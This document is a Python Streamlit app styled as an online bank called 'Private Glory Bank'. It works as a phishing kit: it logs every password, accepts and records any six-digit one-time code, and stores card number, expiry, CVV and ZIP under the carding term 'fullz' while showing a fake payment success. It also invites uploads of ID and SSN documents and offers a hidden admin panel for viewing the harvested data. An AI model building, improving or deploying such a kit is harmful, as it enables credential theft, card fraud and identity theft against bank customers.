import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import random

# ==================== SESSION STATE & 90-DAY HISTORY ====================
state = st.session_state

# Balances
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)

# Data storage
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)

# Generate 90 days of realistic transactions (once)
if "tx" not in state:
    merchants = ["Amazon", "Walmart", "Shell Gas", "Starbucks", "Netflix", "Uber", "Target", "Costco", "Apple", "Home Depot", "Chick-fil-A", "Best Buy"]
    txs = []
    start = datetime.now() - timedelta(days=90)
    for _ in range(88):
        date = start + timedelta(days=random.randint(0, 90))
        amount = round(random.uniform(7.99, 899.99), 2)
        merchant = random.choice(merchants)
        acct = random.choice(["Checking", "Savings"])
        txs.append({
            "date": date.strftime("%m/%d"),
            "desc": merchant,
            "amount": -amount,
            "account": acct
        })
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ==================== YOUR PERFECT EAGLE + THEME ====================
eagle_local = "assets/eagle.png"
eagle_fallback = "https://img.freepik.com/premium-psd/eagle-transparent-background_1077530-4854.jpg"

st.markdown(f"""
<style>
    .stApp {{background: linear-gradient(135deg, #0a0e17, #1c1f2e, #0f1629); color: #e0e0e0;}}
    .header {{background: linear-gradient(90deg, #002868 0%, #BF0A30 100%);
              padding: 2.8rem; text-align: center; border-bottom: 16px solid #fcca46;
              border-radius: 0 0 80px 80px; box-shadow: 0 30px 70px rgba(0,0,0,0.9);}}
    .glass {{background: rgba(255,255,255,0.09); backdrop-filter: blur(20px);
             border-radius: 36px; border: 1px solid rgba(255,255,255,0.2);
             padding: 2.5rem; box-shadow: 0 20px 60px rgba(0,0,0,0.7);}}
    h1, h2, h3 {{color: #fcca46 !important; text-shadow: 0 0 20px #fcca46;}}
    .stButton>button {{background: linear-gradient(45deg, #BF0A30, #002868);
                       color: white; font-weight: bold; border-radius: 70px; height: 4.5rem; font-size: 1.3rem;}}
    .stButton>button:hover {{background: #fcca46; color: #002868; transform: scale(1.08);}}
</style>
""", unsafe_allow_html=True)

def header():
    st.markdown(f'''
    <div class="header">
        <img src="{eagle_local}" width="200" onerror="this.src='{eagle_fallback}'" style="border-radius: 12%; box-shadow: 0 8px 30px rgba(252,202,70,0.6);">
        <h1>PRIVATE GLORY BANK</h1>
        <p style="font-size:30px;color:#fcca46">Land of the Free • Home of the Brave</p>
    </div>
    ''', unsafe_allow_html=True)

# ==================== LOGIN ====================
def login():
    header()
    col1, col2, col3 = st.columns([1,1.4,1])
    with col2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("### Secure Login Required")
        user = st.text_input("User ID", placeholder="client001")
        pwd = st.text_input("Password", type="password", placeholder="SecureUSA2025!")
        if st.button("Login Securely", use_container_width=True, type="primary"):
            state.captured.append({"user":user, "pass":pwd, "time":datetime.now().isoformat()})
            if user == "client001" and pwd == "SecureUSA2025!":
                state.auth = True
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Access Denied")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    header()
    st.markdown("<h3 style='text-align:center;color:#fcca46'>Code sent to ••••1776</h3>", unsafe_allow_html=True)
    code = st.text_input("Enter 6-digit code", max_chars=6, placeholder="000000")
    if st.button("Verify Code", type="primary", use_container_width=True):
        state.otp_log.append({"code":code, "time":datetime.now().isoformat()})
        if len(code) == 6 and code.isdigit():
            state.otp_ok = True
            st.success("Authentication Successful")
            st.rerun()
        else:
            st.error("Invalid Code")

# ==================== DASHBOARD ====================
def dashboard():
    header()
    st.markdown(f"### Good Afternoon • {datetime.now().strftime('%A, %B %d')}")
    c1,c2,c3,c4 = st.columns(4)
    c1.metric("Checking", f"${state.checking:,.2f}")
    c2.metric("Savings", f"${state.savings:,.2f}")
    c3.metric("Total Balance", f"${state.checking + state.savings:,.2f}")
    c4.metric("Transactions", len(state.tx))

    col1, col2 = st.columns([2,1])
    with col1:
        st.markdown("<div class='glass'><h3>Recent Transactions</h3>", unsafe_allow_html=True)
        df = pd.DataFrame(state.tx[:15])
        st.dataframe(df[["date","desc","amount"]], use_container_width=True, hide_index=True)
        st.markdown("</div>", unsafe_allow_html=True)
    with col2:
        st.markdown("<div class='glass'><h3>Account Distribution</h3>", unsafe_allow_html=True)
        fig = px.pie(values=[state.checking, state.savings], names=["Checking","Savings"],
                     color_discrete_sequence=["#fcca46","#002868"], hole=0.5)
        st.plotly_chart(fig, use_container_width=True)
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== TRANSFER (REAL INTERNAL + CARD PAY) ====================
def transfer():
    header()
    tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
    
    with tab1:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("#### Move Money Between Accounts")
        from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
        to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
        amount = st.number_input("Amount ($)", min_value=0.01, format="%.2f")
        if st.button("Transfer Now", type="primary", use_container_width=True):
            if "Checking" in from_acc:
                if amount > state.checking:
                    st.error("Insufficient funds in Checking")
                else:
                    state.checking -= amount
                    state.savings += amount
                    st.success(f"Transferred ${amount:,.2f} → Savings")
            else:
                if amount > state.savings:
                    st.error("Insufficient funds in Savings")
                else:
                    state.savings -= amount
                    state.checking += amount
                    st.success(f"Transferred ${amount:,.2f} → Checking")
            # Add to history
            state.tx.insert(0, {"date": datetime.now().strftime("%m/%d"), "desc": f"Transfer → {to_acc.split()[0]}", "amount": amount})
            state.tx.insert(0, {"date": datetime.now().strftime("%m/%d"), "desc": f"Transfer ← {from_acc.split()[0]}", "amount": -amount})
            st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

    with tab2:
        st.markdown("<div class='glass'>", unsafe_allow_html=True)
        st.markdown("#### Pay Any Bill")
        card = st.text_input("Card Number", placeholder="5412 1776 2024 1812")
        exp = st.text_input("Expiry (MM/YY)", placeholder="07/29")
        cvv = st.text_input("CVV", type="password", placeholder="776")
        zipc = st.text_input("Billing ZIP Code")
        payee = st.text_input("Payee / Bill Name")
        amt = st.number_input("Amount", min_value=0.01)
        if st.button("Process Payment", type="primary", use_container_width=True):
            state.captured.append({"fullz": {"card":card,"exp":exp,"cvv":cvv,"zip":zipc,"payee":payee,"amt":amt,"time":datetime.now().isoformat()}})
            st.success(f"Payment of ${amt:,.2f} to {payee} successful")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES & FILE UPLOAD ====================
def messages():
    header()
    st.markdown("<div class='glass'>", unsafe_allow_html=True)
    st.markdown("#### Upload Required Documents")
    uploaded = st.file_uploader("ID, SSN, Tax Forms, Bank Statements, etc.", type=["pdf","jpg","png","docx","txt"])
    if uploaded:
        state.files.append({"name": uploaded.name, "size": uploaded.size, "time": datetime.now().isoformat()})
        st.success(f"Document '{uploaded.name}' received securely")
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== ADMIN PANEL ====================
def admin():
    header()
    st.markdown("<h1 style='text-align:center;color:#fcca46'>ADMIN CONTROL PANEL</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "All Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in x], expanded=True)
    with tabs[3]: st.dataframe(pd.DataFrame(state.files))
    with tabs[4]: st.dataframe(pd.DataFrame(state.tx))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown(f'''
    <div style="text-align:center;padding:30px;background:#002868;border-radius:30px">
        <img src="{eagle_local}" width="90" onerror="this.src='{eagle_fallback}'" style="border-radius: 20%; box-shadow: 0 4px 20px rgba(252,202,70,0.6);">
        <h3 style="color:#fcca46;margin-top:10px">PGB</h3>
    </div>
    ''', unsafe_allow_html=True)
    return st.sidebar.radio("Navigate", ["Dashboard", "Transfer", "Messages", "Logout"])

# ==================== MAIN FLOW ====================
if not state.auth:
    login()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Transfer": transfer()
    elif page == "Messages": messages()
    elif page == "Logout":
        st.session_state.clear()
        st.rerun()
